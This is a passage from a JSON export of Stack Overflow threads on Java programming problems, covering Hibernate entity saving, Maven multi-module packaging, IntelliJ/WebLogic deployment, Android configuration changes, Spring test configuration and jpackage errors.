hackathon;}\n</code></pre>\n<p>Member class:</p>\n<pre><code>public class Member {\n\n@EmbeddedId\nprivate MemberId id;\n\nprivate String name;\n\nprivate String mail;\n\nprivate String lastName;\n\nprivate String role;\n\n@ManyToOne(fetch = FetchType.LAZY,cascade = ALL)\n@JoinColumn(name=&quot;teamid&quot;,insertable = false, updatable = false )\nprivate Team team;}\n</code></pre>\n<p>MemberId class:</p>\n<pre><code>public class MemberId implements Serializable {\n\n\n@GeneratedValue(strategy = GenerationType.AUTO)\nprivate Long memberID;\n\n@Column(insertable=true, updatable=true)\nprivate Long teamID;}\n</code></pre>\n<p>Controller:</p>\n<pre><code>@PostMapping(&quot;/administrator/addTeam&quot;)\npublic String saveTeam(Model model,\n                      @NotNull @Valid\n                       @ModelAttribute Team team,\n                       BindingResult bindingResult,\n                       HttpServletRequest request){\n\n    if(team.getAdministrator() == null){\n        Administrator administrator = (Administrator) request.getSession().getAttribute(&quot;user&quot;);\n        team.setAdministrator(administrator);\n    }\n\n    \n    Team teamForSave = new Team(0L,team.getName(),new ArrayList&lt;&gt;(),new HashSet&lt;&gt;(), team.getMentor(), team.getAdministrator(), team.getHackathon());\n\n    Team savedTeam = teamService.save(teamForSave);\n\n    if(team.getMembers() != null ) {\n        for (Member m :\n                team.getMembers()) {\n            Member member = new Member(new MemberId(0L, savedTeam.getTeamID())\n                    ,m.getName()\n                    ,m.getMail()\n                    ,m.getLastName()\n                    ,m.getRole()\n                    ,savedTeam);\n            Member savedMember = memberService.save(member);\n        }\n    }\n    model.addAttribute(&quot;team&quot;,savedTeam);\n    return &quot;team&quot;;\n}\n</code></pre>\n<p>Hibernate logg:</p>\n<pre><code>Hibernate: insert into team (administratorid, hackathonid, mentorid, name) values (?, ?, ?, ?)\nHibernate: select member0_.memberid as memberid1_5_2_, member0_.teamid as teamid2_5_2_, member0_.last_name as last_nam3_5_2_, member0_.mail as mail4_5_2_, member0_.name as name5_5_2_, member0_.role as role6_5_2_, team1_.teamid as teamid1_7_0_, team1_.administratorid as administ3_7_0_, team1_.hackathonid as hackatho4_7_0_, team1_.mentorid as mentorid5_7_0_, team1_.name as name2_7_0_, marks2_.teamid as teamid2_4_4_, marks2_.markid as markid1_4_4_, marks2_.markid as markid1_4_1_, marks2_.teamid as teamid2_4_1_, marks2_.comment as comment3_4_1_, marks2_.complexity as complexi4_4_1_, marks2_.design as design5_4_1_, marks2_.efficiency as efficien6_4_1_, marks2_.judgeid as judgeid7_4_1_ from member member0_ left outer join team team1_ on member0_.teamid=team1_.teamid left outer join mark marks2_ on team1_.teamid=marks2_.teamid where member0_.memberid=? and member0_.teamid=?\nHibernate: insert into member (last_name, mail, name, role, memberid, teamid) values (?, ?, ?, ?, ?, ?)\nHibernate: update member set last_name=?, mail=?, name=?, role=? where memberid=? and teamid=?\n</code></pre>\n<p>So, team is saved correctly ,first member also , and then this error occurs.\nUse case is:\nIm adding new team on form ,including adding members into table,setting the randomNegativeId for each member for tracking delete from table , setting team id -1 for showing correct form in view.\nBut here in controller im creating new Team and copy values , so i dont know why it doesnt work.\nI tried to save all at once with cascading but then error is that teamid column is null on members .I really need help with this. Thanks in advance</p>\n"},{"tags":["java","spring","spring-boot","azure","maven"],"comments":[{"owner":{"account_id":888714,"reputation":34077,"user_id":927493,"accept_rate":61,"display_name":"J Fabian Meier"},"score":0,"creation_date":1683042388,"post_id":76156522,"comment_id":134304374,"body_markdown":"Sorry, I do not really understand. If you declare other modules are `&lt;dependencies&gt;` in the `pom.xml`, they should be included automatically.","body":"Sorry, I do not really understand. If you declare other modules are <code>&lt;dependencies&gt;</code> in the <code>pom.xml</code>, they should be included automatically."},{"owner":{"account_id":21994,"reputation":73798,"user_id":53897,"accept_rate":56,"display_name":"Thorbj&#248;rn Ravn Andersen"},"score":1,"creation_date":1683043017,"post_id":76156522,"comment_id":134304519,"body_markdown":"Have you looked at the spring boot documentation?","body":"Have you looked at the spring boot documentation?"},{"owner":{"account_id":28484305,"reputation":9,"user_id":21797825,"display_name":"kmanish"},"score":0,"creation_date":1683051427,"post_id":76156522,"comment_id":134306380,"body_markdown":"I did. When the Parent POM have the &lt;package&gt;pom&lt;/package&gt;                          \n        and                                                                                                         \n     &lt;modules&gt;\n        &lt;module&gt;module-one&lt;/module&gt;\n        &lt;module&gt;module-two&lt;/module&gt;\n    &lt;/modules&gt;. Then the mvn clean install DOES NOT create the JAR file","body":"I did. When the Parent POM have the &lt;package&gt;pom&lt;/package&gt;                                   and                                                                                                               &lt;modules&gt;         &lt;module&gt;module-one&lt;/module&gt;         &lt;module&gt;module-two&lt;/module&gt;     &lt;/modules&gt;. Then the mvn clean install DOES NOT create the JAR file"},{"owner":{"account_id":15064163,"reputation":13519,"user_id":10871900,"display_name":"dan1st is crying"},"score":0,"creation_date":1683717124,"post_id":76156522,"comment_id":134408511,"body_markdown":"Can you show the `pom.xml` files? Are the modules dependent on each other? Did you check the `target` directory of the child modules for the JARs as well?","body":"Can you show the <code>pom.xml</code> files? Are the modules dependent on each other? Did you check the <code>target</code> directory of the child modules for the JARs as well?"}],"owner":{"account_id":28484305,"reputation":9,"user_id":21797825,"display_name":"kmanish"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":132,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":0,"score":0,"last_activity_date":1683716929,"creation_date":1683041645,"question_id":76156522,"body_markdown":"Please help me in creating 1 jar file includes all the modules / class files in Spring Boot Multi Module Project. Using Maven and build tool and need to create Single Jar file and executable as Spring boot project. \r\nTried using the Maven Assembly but it does not includes the Modules Jar file into Parent&#39;s Project when Jar is created\r\n\r\nNeed help with sample POM files and Modules POM file","title":"Spring Boot Multi Module Application - How to create one deployable single jar file to execute using maven clean install command","body":"<p>Please help me in creating 1 jar file includes all the modules / class files in Spring Boot Multi Module Project. Using Maven and build tool and need to create Single Jar file and executable as Spring boot project.\nTried using the Maven Assembly but it does not includes the Modules Jar file into Parent's Project when Jar is created</p>\n<p>Need help with sample POM files and Modules POM file</p>\n"},{"tags":["java","debugging","intellij-idea","deployment","weblogic"],"comments":[{"owner":{"account_id":17693330,"reputation":3781,"user_id":12844632,"display_name":"Egor Klepikov"},"score":0,"creation_date":1683718723,"post_id":76217656,"comment_id":134408883,"body_markdown":"You can try to configure the server so that it doesn&#39;t deploy anything on start. Start the server outside of IntelliJ IDEA to verify that nothing is deployed. One more possible solution https://intellij-support.jetbrains.com/hc/en-us/community/posts/360000129390/comments/4403071761042","body":"You can try to configure the server so that it doesn&#39;t deploy anything on start. Start the server outside of IntelliJ IDEA to verify that nothing is deployed. One more possible solution <a href=\"https://intellij-support.jetbrains.com/hc/en-us/community/posts/360000129390/comments/4403071761042\" rel=\"nofollow noreferrer\">intellij-support.jetbrains.com/hc/en-us/community/posts/&hellip;</a>"}],"owner":{"account_id":11336024,"reputation":122,"user_id":8311849,"display_name":"Yusuf Erdoğan"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":50,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683716749,"creation_date":1683716749,"question_id":76217656,"body_markdown":"I am working on a legacy code and I must deploy project on Weblogic server because of JNDI connections. Everything is  work fine but project deploys twice on startup. I think IntelliJ deploys project after Weblogic server startup deploys. This problem slows us down. I found some solution on linux machines but I need a solution on windows.\r\n \r\nThe solution I found : https://youtrack.jetbrains.com/issue/IDEA-58796\r\n\r\n**IntelliJ version:** 2023.1.1\r\n\r\n**WebLogic version:** 12c\r\n\r\n**JDK :** 1.8\r\n","title":"IntelliJ Undeploy Project on Startup on Weblogic 12","body":"<p>I am working on a legacy code and I must deploy project on Weblogic server because of JNDI connections. Everything is  work fine but project deploys twice on startup. I think IntelliJ deploys project after Weblogic server startup deploys. This problem slows us down. I found some solution on linux machines but I need a solution on windows.</p>\n<p>The solution I found : <a href=\"https://youtrack.jetbrains.com/issue/IDEA-58796\" rel=\"nofollow noreferrer\">https://youtrack.jetbrains.com/issue/IDEA-58796</a></p>\n<p><strong>IntelliJ version:</strong> 2023.1.1</p>\n<p><strong>WebLogic version:</strong> 12c</p>\n<p><strong>JDK :</strong> 1.8</p>\n"},{"tags":["java","android","android-activity"],"comments":[{"owner":{"account_id":238127,"reputation":86162,"user_id":506796,"accept_rate":83,"display_name":"Tenfour04"},"score":0,"creation_date":1636695912,"post_id":69938322,"comment_id":123630309,"body_markdown":"Read up on configuration changes.","body":"Read up on configuration changes."},{"owner":{"account_id":7546768,"reputation":23,"user_id":5729489,"display_name":"Milan"},"score":0,"creation_date":1636696621,"post_id":69938322,"comment_id":123630439,"body_markdown":"@Tenfour04... onConfiguration Changes : Prevent screen size change , orientation change etc... it&#39;s not preventing USB wireless mouse insert/remove..","body":"@Tenfour04... onConfiguration Changes : Prevent screen size change , orientation change etc... it&#39;s not preventing USB wireless mouse insert/remove.."},{"owner":{"account_id":238127,"reputation":86162,"user_id":506796,"accept_rate":83,"display_name":"Tenfour04"},"score":0,"creation_date":1636724329,"post_id":69938322,"comment_id":123639516,"body_markdown":"I think the relevant one here would be `&quot;uiMode&quot;`.","body":"I think the relevant one here would be <code>&quot;uiMode&quot;</code>."}],"answers":[{"tags":[],"owner":{"account_id":20511146,"reputation":250,"user_id":15052881,"display_name":"Programmer007"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1683179657,"creation_date":1683179657,"answer_id":76169960,"question_id":69938322,"body_markdown":"Using wireless mouse causes activity to recreate. Adding **navigation** in configChanges solves the problem.\r\n\r\n    &lt;activity\r\n      ...\r\n      android:configChanges=&quot;orientation|screenSize|keyboard|keyboardHidden|navigation&quot;\r\n    /&gt;\r\n\r\nNow try to insert/remove Bluetooth mouse/keyboard etc. Activity wont recreate.","title":"Android: Android application is going for restart if we insert wireless USB mouse","body":"<p>Using wireless mouse causes activity to recreate. Adding <strong>navigation</strong> in configChanges solves the problem.</p>\n<pre><code>&lt;activity\n  ...\n  android:configChanges=&quot;orientation|screenSize|keyboard|keyboardHidden|navigation&quot;\n/&gt;\n</code></pre>\n<p>Now try to insert/remove Bluetooth mouse/keyboard etc. Activity wont recreate.</p>\n"}],"owner":{"account_id":7546768,"reputation":23,"user_id":5729489,"display_name":"Milan"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":213,"favorite_count":0,"down_vote_count":1,"up_vote_count":2,"accepted_answer_id":76169960,"answer_count":1,"score":1,"last_activity_date":1683716683,"creation_date":1636694644,"question_id":69938322,"body_markdown":"I have one android application which has Main Activity.\r\n\r\nIf we insert wireless USB mouse - Activity restart lifecycle callbacks are getting triggered from android framework. (Like, onPause - onStop - onDestroy - onCreate - onStart - onResume).\r\n\r\nBut, If we insert wired USB mouse - Activity is not restarting.\r\n\r\n**How to prevent activity restart cycle on inserting wireless USB mouse,keyboard etc ??**","title":"Android: Android application is going for restart if we insert wireless USB mouse","body":"<p>I have one android application which has Main Activity.</p>\n<p>If we insert wireless USB mouse - Activity restart lifecycle callbacks are getting triggered from android framework. (Like, onPause - onStop - onDestroy - onCreate - onStart - onResume).</p>\n<p>But, If we insert wired USB mouse - Activity is not restarting.</p>\n<p><strong>How to prevent activity restart cycle on inserting wireless USB mouse,keyboard etc ??</strong></p>\n"},{"tags":["java","mysql","arraylist","pagination","iterator"],"comments":[{"owner":{"account_id":2094057,"reputation":506074,"user_id":1863229,"accept_rate":58,"display_name":"Tim Biegeleisen"},"score":0,"creation_date":1475667652,"post_id":39872827,"comment_id":67032555,"body_markdown":"Is your intention to run a SQL query with each button click, or do you plan to implement some sort of pagination?","body":"Is your intention to run a SQL query with each button click, or do you plan to implement some sort of pagination?"},{"owner":{"account_id":9312529,"reputation":23,"user_id":6913794,"display_name":"Zcyan"},"score":0,"creation_date":1475667942,"post_id":39872827,"comment_id":67032731,"body_markdown":"Maybe the SQL query can run only once. My main intention is to display columns of my database to my textfields and move to the next row using a next button.","body":"Maybe the SQL query can run only once. My main intention is to display columns of my database to my textfields and move to the next row using a next button."},{"owner":{"account_id":2094057,"reputation":506074,"user_id":1863229,"accept_rate":58,"display_name":"Tim Biegeleisen"},"score":0,"creation_date":1475668383,"post_id":39872827,"comment_id":67033037,"body_markdown":"If your result set is relatively small, then you should be doing the query somewhere else.  Just iterate over the collections in the above method.","body":"If your result set is relatively small, then you should be doing the query somewhere else.  Just iterate over the collections in the above method."},{"owner":{"account_id":9312529,"reputation":23,"user_id":6913794,"display_name":"Zcyan"},"score":0,"creation_date":1475668838,"post_id":39872827,"comment_id":67033300,"body_markdown":"Would you be kind to make a guide code for me to follow?","body":"Would you be kind to make a guide code for me to follow?"}],"owner":{"account_id":9312529,"reputation":23,"user_id":6913794,"display_name":"Zcyan"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":106,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1683716674,"creation_date":1475667113,"question_id":39872827,"body_markdown":"I need to display rows of my mySQL database one by one using next button in java. But I&#39;m having a hard time to do it.\r\n\r\nBelow are my current codes. I&#39;m aware that Arraylist and ListIterator should be separated but I don&#39;t know where to put it because I also need them inside my resultset.\r\n\r\n\r\n    JButton btnSubmit = new JButton(&quot;Next&quot;);\r\n\t\tbtnSubmit.addActionListener(new ActionListener() {\r\n\t\t\tpublic void actionPerformed(ActionEvent arg0) {\t\r\n\t\t\t\t\r\n\t\t\t\t  \r\n\t\t\t     try{\r\n\t\t\t\t\t\tConnection connect = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/anonymization&quot;, &quot;root&quot;, &quot;password&quot;);\r\n\t\t\t\t\t\tStatement statement = connect.createStatement();\r\n\t\t\t\t\t\tString examNames = textExamName.getText();\r\n\t\t\t\t\t\tint examNumber = Integer.parseInt(textNumber.getText());\t\t\t\t\t\r\n\t\t\t\t\t\tString selectTable = &quot;Select number, content, choiceA, choiceB, choiceC, choiceD, correctans, * FROM &quot; +examNames+&quot;&quot;;\t\t\t\t\r\n\t\t\t\t\t\tResultSet examresults = statement.executeQuery(&quot;Select * FROM &quot; +examNames+&quot;&quot;);\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\twhile(examresults.next()){\r\n\t\t\t\t\t\tArrayList numbers = new ArrayList();\r\n\t\t\t\t\t\tArrayList contents = new ArrayList();\r\n\t\t\t\t\t\tArrayList A = new ArrayList();\r\n\t\t\t\t\t\tArrayList B = new ArrayList();\r\n\t\t\t\t\t\tArrayList C = new ArrayList();\r\n\t\t\t\t\t\tArrayList D = new ArrayList();\r\n\t\t\t\t\t\tArrayList ans = new ArrayList();\r\n\t\t\t\t\t\tListIterator numberIterator = numbers.listIterator();\t\r\n\t\t\t\t\t\tListIterator  contentIterator = contents.listIterator();\r\n\t\t\t\t\t\tListIterator  AIterator = A.listIterator();\r\n\t\t\t\t\t\tListIterator  BIterator = B.listIterator();\r\n\t\t\t\t\t\tListIterator  CIterator = C.listIterator();\r\n\t\t\t\t\t\tListIterator  DIterator = D.listIterator();\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\tnumbers.add(examresults.getInt(&quot;number&quot;));\r\n\t\t\t\t\t\tcontents.add(examresults.getString(&quot;content&quot;));\r\n\t\t\t\t\t\tA.add(examresults.getString(&quot;choiceA&quot;));\r\n\t\t\t\t\t\tB.add(examresults.getString(&quot;choiceB&quot;));\r\n\t\t\t\t\t\tC.add(examresults.getString(&quot;choiceC&quot;));\r\n\t\t\t\t\t\tD.add(examresults.getString(&quot;choiceD&quot;));\r\n\t\t\t\t\t\tans.add(examresults.getString(&quot;correctans&quot;));\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\tif (numberIterator.hasNext() &amp;&amp; contentIterator.hasNext() &amp;&amp; AIterator.hasNext() &amp;&amp; BIterator.hasNext() \r\n\t\t\t\t\t\t\t\t\t&amp;&amp; CIterator.hasNext() &amp;&amp; DIterator.hasNext()) {\t\t\t         \r\n\t\t\t\t\t\t        textAreaQuestion.setText(contentIterator.next().toString());\r\n\t\t\t\t\t\t      }\r\n\t\t\t\t\t}\r\n\r\n\r\n","title":"Java MySQL Next button","body":"<p>I need to display rows of my mySQL database one by one using next button in java. But I'm having a hard time to do it.</p>\n\n<p>Below are my current codes. I'm aware that Arraylist and ListIterator should be separated but I don't know where to put it because I also need them inside my resultset.</p>\n\n<pre><code>JButton btnSubmit = new JButton(\"Next\");\n    btnSubmit.addActionListener(new ActionListener() {\n        public void actionPerformed(ActionEvent arg0) { \n\n\n             try{\n                    Connection connect = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/anonymization\", \"root\", \"password\");\n                    Statement statement = connect.createStatement();\n                    String examNames = textExamName.getText();\n                    int examNumber = Integer.parseInt(textNumber.getText());                    \n                    String selectTable = \"Select number, content, choiceA, choiceB, choiceC, choiceD, correctans, * FROM \" +examNames+\"\";               \n                    ResultSet examresults = statement.executeQuery(\"Select * FROM \" +examNames+\"\");             \n\n                while(examresults.next()){\n                    ArrayList numbers = new ArrayList();\n                    ArrayList contents = new ArrayList();\n                    ArrayList A = new ArrayList();\n                    ArrayList B = new ArrayList();\n                    ArrayList C = new ArrayList();\n                    ArrayList D = new ArrayList();\n                    ArrayList ans = new ArrayList();\n                    ListIterator numberIterator = numbers.listIterator();   \n                    ListIterator  contentIterator = contents.listIterator();\n                    ListIterator  AIterator = A.listIterator();\n                    ListIterator  BIterator = B.listIterator();\n                    ListIterator  CIterator = C.listIterator();\n                    ListIterator  DIterator = D.listIterator();     \n\n                    numbers.add(examresults.getInt(\"number\"));\n                    contents.add(examresults.getString(\"content\"));\n                    A.add(examresults.getString(\"choiceA\"));\n                    B.add(examresults.getString(\"choiceB\"));\n                    C.add(examresults.getString(\"choiceC\"));\n                    D.add(examresults.getString(\"choiceD\"));\n                    ans.add(examresults.getString(\"correctans\"));\n\n\n            if (numberIterator.hasNext() &amp;&amp; contentIterator.hasNext() &amp;&amp; AIterator.hasNext() &amp;&amp; BIterator.hasNext() \n                                &amp;&amp; CIterator.hasNext() &amp;&amp; DIterator.hasNext()) {                     \n                            textAreaQuestion.setText(contentIterator.next().toString());\n                          }\n                }\n</code></pre>\n"},{"tags":["java","sockets","network-programming","nio"],"comments":[{"owner":{"account_id":71739,"reputation":307142,"user_id":207421,"accept_rate":82,"display_name":"user207421"},"score":0,"creation_date":1683850255,"post_id":76217606,"comment_id":134433652,"body_markdown":"Sadly no, there isn&#39;t.","body":"Sadly no, there isn&#39;t."}],"owner":{"account_id":17976446,"reputation":111,"user_id":13063887,"display_name":"light"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":25,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683716429,"creation_date":1683716429,"question_id":76217606,"body_markdown":"Is there a graceful way to solve this problem, given a `SocketChannel` and a readable event ,to determine whether or not the RST has been sent by the peer. \r\n\r\n\r\n\r\nI use `kill -9` to eixt the client process, and at the last moment, I see the client side sent a RST to the server.   \r\n\r\n[![enter image description here](https://i.stack.imgur.com/IexX5.png)](https://i.stack.imgur.com/IexX5.png)\r\n\r\nAnd the latter, the server side received an &quot;readable event&quot;. If read the SocketChannel directly, will got the error:\r\n\r\n```\r\nException in thread &quot;main&quot; java.net.SocketException: Connection reset\r\n```\r\n\r\nAlthough it really told the fact, a RST sent by the client side, but the exception type is `SocketException`, which is too generic.\r\nIs there a better way?","title":"How to know whether or not a RST sent by peer , while read/write on a SocketChannel. (JAVA)","body":"<p>Is there a graceful way to solve this problem, given a <code>SocketChannel</code> and a readable event ,to determine whether or not the RST has been sent by the peer.</p>\n<p>I use <code>kill -9</code> to eixt the client process, and at the last moment, I see the client side sent a RST to the server.</p>\n<p><a href=\"https://i.stack.imgur.com/IexX5.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/IexX5.png\" alt=\"enter image description here\" /></a></p>\n<p>And the latter, the server side received an &quot;readable event&quot;. If read the SocketChannel directly, will got the error:</p>\n<pre><code>Exception in thread &quot;main&quot; java.net.SocketException: Connection reset\n</code></pre>\n<p>Although it really told the fact, a RST sent by the client side, but the exception type is <code>SocketException</code>, which is too generic.\nIs there a better way?</p>\n"},{"tags":["java","spring","spring-mvc","cassandra"],"comments":[{"owner":{"account_id":4470050,"reputation":68258,"user_id":3636601,"accept_rate":75,"display_name":"Jens"},"score":0,"creation_date":1499255297,"post_id":44925324,"comment_id":76826061,"body_markdown":"Where you see a bean of class cluster  (implementation of an Interface Cluster) in your code that can be autovired??","body":"Where you see a bean of class cluster  (implementation of an Interface Cluster) in your code that can be autovired??"},{"owner":{"account_id":4470050,"reputation":68258,"user_id":3636601,"accept_rate":75,"display_name":"Jens"},"score":1,"creation_date":1499255385,"post_id":44925324,"comment_id":76826140,"body_markdown":"one possible Solution: remove this two lines: `@Autowired\n  private Cluster cluster = null;`","body":"one possible Solution: remove this two lines: <code>@Autowired   private Cluster cluster = null;</code>"},{"owner":{"account_id":3522604,"reputation":2433,"user_id":2944502,"accept_rate":64,"display_name":"fengye87"},"score":0,"creation_date":1499255449,"post_id":44925324,"comment_id":76826194,"body_markdown":"I haven&#39;t defined any bean of Class Cluster, it&#39;s supposed to be provided by spring-boot-starter-data-cassandra. And if I run my application, it just works.","body":"I haven&#39;t defined any bean of Class Cluster, it&#39;s supposed to be provided by spring-boot-starter-data-cassandra. And if I run my application, it just works."},{"owner":{"account_id":4470050,"reputation":68258,"user_id":3636601,"accept_rate":75,"display_name":"Jens"},"score":0,"creation_date":1499255554,"post_id":44925324,"comment_id":76826282,"body_markdown":"then there is something in the testconfiguration missing","body":"then there is something in the testconfiguration missing"}],"answers":[{"tags":[],"owner":{"account_id":2257408,"reputation":4873,"user_id":1988304,"accept_rate":92,"display_name":"JimHawkins"},"down_vote_count":0,"up_vote_count":95,"is_accepted":true,"score":95,"last_activity_date":1499255572,"creation_date":1499255572,"answer_id":44925488,"question_id":44925324,"body_markdown":"The test environment needs to know where your beans are defined, so you have to tell it the location.\r\n\r\nIn your test class, add the `@ContextConfiguration` annotation:\r\n\r\n&lt;!-- language: lang-java --&gt;\r\n\r\n    @RunWith(SpringRunner.class)\r\n    @AutoConfigureTestDatabase(replace = Replace.NONE)\r\n    @DataJpaTest\r\n    @ContextConfiguration(classes = {YourBeans.class, MoreOfYourBeans.class})\r\n    public class UserRepoTest {\r\n    \r\n      @Autowired\r\n      private UserRepo userRepo = null;\r\n    \r\n      @Autowired\r\n      private TestEntityManager entityManager = null;\r\n\r\n","title":"Spring boot test &quot;No qualifying bean of type available&quot;","body":"<p>The test environment needs to know where your beans are defined, so you have to tell it the location.</p>\n\n<p>In your test class, add the <code>@ContextConfiguration</code> annotation:</p>\n\n<pre class=\"lang-java prettyprint-override\"><code>@RunWith(SpringRunner.class)\n@AutoConfigureTestDatabase(replace = Replace.NONE)\n@DataJpaTest\n@ContextConfiguration(classes = {YourBeans.class, MoreOfYourBeans.class})\npublic class UserRepoTest {\n\n  @Autowired\n  private UserRepo userRepo = null;\n\n  @Autowired\n  private TestEntityManager entityManager = null;\n</code></pre>\n"}],"owner":{"account_id":3522604,"reputation":2433,"user_id":2944502,"accept_rate":64,"display_name":"fengye87"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":95622,"favorite_count":0,"down_vote_count":1,"up_vote_count":57,"accepted_answer_id":44925488,"answer_count":1,"score":56,"last_activity_date":1683715861,"creation_date":1499255145,"question_id":44925324,"body_markdown":"I&#39;m quite a newbie to Spring boot, but here&#39;s the problem I&#39;m facing now:\r\n\r\n    // Application.java\r\n    public class Application {\r\n      public static void main(String[] args) {\r\n        SpringApplication.run(Application.class, args);\r\n      }\r\n\r\n      @Autowired\r\n      private Cluster cluster = null;\r\n\r\n      @PostConstruct\r\n      private void migrateCassandra() {\r\n        Database database = new Database(this.cluster, &quot;foo&quot;);\r\n        MigrationTask migration = new MigrationTask(database, new MigrationRepository());\r\n        migration.migrate();\r\n      }\r\n    }\r\n\r\nSo basically, I&#39;m trying to bootstrap a spring application, and after that, do some cassandra migrations.\r\n\r\nI also have defined a repository for my user model:\r\n\r\n    // UserRepo.java\r\n    public interface UserRepo extends CassandraRepository&lt;User&gt; {\r\n    }\r\n\r\nNow I&#39;m trying to test my repo class using the following simple test case:\r\n\r\n    // UserRepoTest.java\r\n    @RunWith(SpringRunner.class)\r\n    @AutoConfigureTestDatabase(replace = Replace.NONE)\r\n    @DataJpaTest\r\n    public class UserRepoTest {\r\n    \r\n      @Autowired\r\n      private UserRepo userRepo = null;\r\n    \r\n      @Autowired\r\n      private TestEntityManager entityManager = null;\r\n    \r\n      @Test\r\n      public void findOne_whenUserExists_thenReturnUser() {\r\n        String id = UUID.randomUUID().toString();\r\n        User user = new User();\r\n        user.setId(id);\r\n        this.entityManager.persist(user);\r\n    \r\n        assertEquals(this.userRepo.findOne(user.getId()).getId(), id);\r\n      }\r\n    \r\n      @Test\r\n      public void findOne_whenUserNotExists_thenReturnNull() {\r\n        assertNull(this.userRepo.findOne(UUID.randomUUID().toString()));\r\n      }\r\n    }\r\n\r\nI would expect the test to pass, but instead, I got an error saying &quot;No qualifying bean of type &#39;com.datastax.driver.core.Cluster&#39; available&quot;. It looks like spring failed to autowire the `cluster` object, but why is that? How do I fix this? Thanks a lot!","title":"Spring boot test &quot;No qualifying bean of type available&quot;","body":"<p>I'm quite a newbie to Spring boot, but here's the problem I'm facing now:</p>\n\n<pre><code>// Application.java\npublic class Application {\n  public static void main(String[] args) {\n    SpringApplication.run(Application.class, args);\n  }\n\n  @Autowired\n  private Cluster cluster = null;\n\n  @PostConstruct\n  private void migrateCassandra() {\n    Database database = new Database(this.cluster, \"foo\");\n    MigrationTask migration = new MigrationTask(database, new MigrationRepository());\n    migration.migrate();\n  }\n}\n</code></pre>\n\n<p>So basically, I'm trying to bootstrap a spring application, and after that, do some cassandra migrations.</p>\n\n<p>I also have defined a repository for my user model:</p>\n\n<pre><code>// UserRepo.java\npublic interface UserRepo extends CassandraRepository&lt;User&gt; {\n}\n</code></pre>\n\n<p>Now I'm trying to test my repo class using the following simple test case:</p>\n\n<pre><code>// UserRepoTest.java\n@RunWith(SpringRunner.class)\n@AutoConfigureTestDatabase(replace = Replace.NONE)\n@DataJpaTest\npublic class UserRepoTest {\n\n  @Autowired\n  private UserRepo userRepo = null;\n\n  @Autowired\n  private TestEntityManager entityManager = null;\n\n  @Test\n  public void findOne_whenUserExists_thenReturnUser() {\n    String id = UUID.randomUUID().toString();\n    User user = new User();\n    user.setId(id);\n    this.entityManager.persist(user);\n\n    assertEquals(this.userRepo.findOne(user.getId()).getId(), id);\n  }\n\n  @Test\n  public void findOne_whenUserNotExists_thenReturnNull() {\n    assertNull(this.userRepo.findOne(UUID.randomUUID().toString()));\n  }\n}\n</code></pre>\n\n<p>I would expect the test to pass, but instead, I got an error saying \"No qualifying bean of type 'com.datastax.driver.core.Cluster' available\". It looks like spring failed to autowire the <code>cluster</code> object, but why is that? How do I fix this? Thanks a lot!</p>\n"},{"tags":["java","macos","jpackage"],"answers":[{"tags":[],"owner":{"account_id":5998820,"reputation":12656,"user_id":4712734,"display_name":"DuncG"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1683715244,"creation_date":1683714802,"answer_id":76217368,"question_id":76217275,"body_markdown":"You have used same input and output dir parameters `-i` and `-d`, so you are seeing a recursive copy of one to the other - probably getting deeper levels each time you run the command. Use separate folders for each parameter.\r\n\r\nThe `--dest` / `-d` value is more suitable to be set as a temporary build location so it can be cleared by a &quot;clean&quot; operation of whatever build system you use and regenerated cleanly by next run.\r\n","title":"jpackage FileSystemException","body":"<p>You have used same input and output dir parameters <code>-i</code> and <code>-d</code>, so you are seeing a recursive copy of one to the other - probably getting deeper levels each time you run the command. Use separate folders for each parameter.</p>\n<p>The <code>--dest</code> / <code>-d</code> value is more suitable to be set as a temporary build location so it can be cleared by a &quot;clean&quot; operation of whatever build system you use and regenerated cleanly by next run.</p>\n"}],"owner":{"account_id":10447334,"reputation":11,"user_id":7701996,"display_name":"Cor"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":49,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683715244,"creation_date":1683714091,"question_id":76217275,"body_markdown":"I have a Java project (on Mac OSX and in Eclipse) where jpackage produces an error I don&#39;t understand\r\n\r\nThe jpackage command is as follows:\r\n\r\n```\r\nexport JAVA_HOME=&quot;/Library/Java/JavaVirtualMachines/jdk-17.0.5.jdk/Contents/Home&quot;\r\nexport PATH=$JAVA_HOME/bin:$PATH\r\n\r\njpackage \\\r\n    --type app-image \\\r\n    -i ../Released \\\r\n    -d ../Released \\\r\n    -n &quot;Boekhouding&quot; \\\r\n    --app-version &quot;1.3.7&quot; \\\r\n    --icon ../../Images/euro.icns \\\r\n    --main-jar run.jar \\\r\n    --verbose\r\n```\r\n\r\nThis jpackage version and command works with another project but not with this project. The error is as follows:\r\n\r\n\r\n```\r\njava.nio.file.FileSystemException: 